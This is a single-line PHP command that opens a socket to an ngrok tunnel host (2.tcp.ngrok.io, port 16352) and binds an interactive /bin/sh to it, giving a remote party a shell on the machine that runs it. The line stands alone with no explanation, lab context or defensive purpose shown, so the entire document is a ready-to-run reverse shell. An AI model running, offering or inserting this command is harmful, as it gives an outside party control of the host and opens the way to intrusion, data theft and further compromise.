php -r '$sock=fsockopen("2.tcp.ngrok.io",16352);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
